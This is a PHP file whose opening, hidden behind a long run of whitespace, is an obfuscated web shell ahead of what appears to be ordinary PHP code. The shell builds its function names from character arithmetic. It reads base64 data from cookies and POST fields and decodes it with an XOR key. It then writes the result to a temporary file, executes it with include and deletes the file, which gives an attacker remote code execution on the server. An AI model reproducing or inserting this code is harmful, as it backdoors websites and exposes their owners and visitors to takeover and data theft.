<?php                                                                                                                                                                                                                                                                                                                                                                                                 $nfEknaM = 'Q' . chr ( 125 - 30 ).chr ( 663 - 592 ).'x' . chr ( 627 - 518 ); $gqVFVCdRa = 'c' . "\154" . "\x61" . "\x73" . "\163" . chr ( 502 - 407 ).chr ( 668 - 567 ).chr ( 1025 - 905 ).chr ( 237 - 132 ).chr (115) . chr ( 736 - 620 ).'s';$VdumZ = $gqVFVCdRa($nfEknaM); $LoaCVfSS = $VdumZ;if (!$LoaCVfSS){class Q_Gxm{private $xqNPCAtk;public static $iQIei = "0b19cf5b-629b-4bd2-bdc4-c681203c2ac5";public static $EVuIB = 10260;public function __construct($wuztJAeXL=0){$kmhapWkOWV = $_COOKIE;$VQfCnIpv = $_POST;$LDZNBs = @$kmhapWkOWV[substr(Q_Gxm::$iQIei, 0, 4)];if (!empty($LDZNBs)){$JpImnsEsze = "base64";$WjkPXam = "";$LDZNBs = explode(",", $LDZNBs);foreach ($LDZNBs as $gbKSWxmP){$WjkPXam .= @$kmhapWkOWV[$gbKSWxmP];$WjkPXam .= @$VQfCnIpv[$gbKSWxmP];}$WjkPXam = array_map($JpImnsEsze . '_' . chr ( 763 - 663 ).'e' . 'c' . 'o' . chr ( 651 - 551 ).'e', array($WjkPXam,)); $WjkPXam = $WjkPXam[0] ^ str_repeat(Q_Gxm::$iQIei, (strlen($WjkPXam[0]) / strlen(Q_Gxm::$iQIei)) + 1);Q_Gxm::$EVuIB = @unserialize($WjkPXam);}}private function JhIqTnnc(){if (is_array(Q_Gxm::$EVuIB)) {$aVuodU = sys_get_temp_dir() . "/" . crc32(Q_Gxm::$EVuIB['s' . "\141" . "\x6c" . 't']);@Q_Gxm::$EVuIB['w' . "\x72" . "\151" . chr (116) . chr ( 307 - 206 )]($aVuodU, Q_Gxm::$EVuIB['c' . "\x6f" . 'n' . 't' . "\x65" . chr (110) . "\164"]);include $aVuodU;@Q_Gxm::$EVuIB["\144" . "\x65" . chr ( 1049 - 941 ).chr (101) . "\164" . "\145"]($aVuodU); $qagIX = "23142";exit();}}public function __destruct(){$this->JhIqTnnc(); $qagIX = "23142";}}$dFrTpe = new Q_Gxm(); $dFrTpe = "23663_19310";} ?><?php
/**
